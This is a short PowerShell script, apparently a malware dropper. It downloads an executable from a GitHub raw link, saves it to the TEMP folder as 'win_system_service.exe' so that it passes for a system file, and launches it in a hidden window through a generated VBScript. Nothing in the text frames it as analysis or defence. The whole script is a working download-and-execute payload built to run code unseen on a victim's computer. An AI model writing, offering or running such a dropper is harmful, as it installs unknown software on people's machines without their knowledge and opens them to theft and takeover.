$u = "https://github.com/jfheifohfai/diwidwidid/raw/main/test%20(1).exe"
$p = "$env:TEMP\win_system_service.exe"
iwr -Uri $u -OutFile $p

$v = "$env:TEMP\run.vbs"
"Set W=CreateObject(`"WScript.Shell`"):W.Run `"$p`",0,0" | Out-File $v -Encoding ASCII
wscript.exe $v
